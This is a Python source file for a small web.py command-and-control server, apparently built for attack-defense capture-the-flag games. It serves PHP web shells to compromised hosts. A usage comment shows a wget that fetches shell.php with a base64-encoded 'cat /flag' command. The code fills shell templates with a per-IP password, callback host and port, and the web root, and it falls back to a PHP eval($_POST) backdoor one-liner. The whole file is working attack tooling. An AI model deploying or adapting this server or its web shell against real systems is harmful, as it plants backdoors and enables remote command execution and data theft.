#!/usr/bin/env python
# -*- coding: utf-8 -*-

# useage:
#   start ccServer:
#       import ccserver
#       ccserver.run()
#   download a shell:
#       wget http://192.168.1.1/crontab/Y2F0IC9mbGFn/shell.php
#       base64_encode('cat /flag') => Y2F0IC9mbGFn

import web
import os
import logging
import sys
import base64

urls = (
    '/(?P<name>.+)/(?P<cmd>.+)/(?P<fileName>.+)','CCServer',
    '/.*', 'Default'
)

approot = os.path.join(os.path.split(os.path.realpath(__file__))[0], '..', '..')
sys.path.append(approot)
from configuration import configuration
from utils import Utils

class CCServer(object):
    def __init__(self):
        self._conf = configuration
        self._folder = os.path.join(approot,'templates')

    def GET(self,name,cmd,fileName):
        try:
            command = base64.b64decode(cmd)
        except:
            command = self._conf.flagCommand
        parameters = {
            "password": Utils.getPassword(web.ctx.ip),
            "file": fileName,
            "cmd": command,
            "host": self._conf.bindAddress,
            "port": self._conf.bindPort,
            "func": self._conf.phpFunction,
            "root": self._conf.webRoot
        }
        templateFile = os.path.join(self._folder,name+".temp")
        if os.access(templateFile, os.R_OK):
            try:
                with open(templateFile, 'r') as temp:
                    return temp.read() % parameters
            except:
                logging.info("get template %s failed." % name)
                return "<?php @eval($_POST['%(password)s']);?>" % parameters
        else:
            logging.info("template %s not found." % name)
            return "<?php @eval($_POST['%(password)s']);?>" % parameters

class Default(object):
    def GET(self):
        return "<?php @eval($_POST['%(password)s']);?>" % {"password":Utils.getPassword(web.ctx.ip)}


class MyApplication(web.application):
    def run(self, port=8080, *middleware):
        func = self.wsgifunc(*middleware)
        return web.httpserver.runsimple(func, ('0.0.0.0', port))

app = MyApplication(urls, globals())

if __name__ == "__main__":
    app.run()
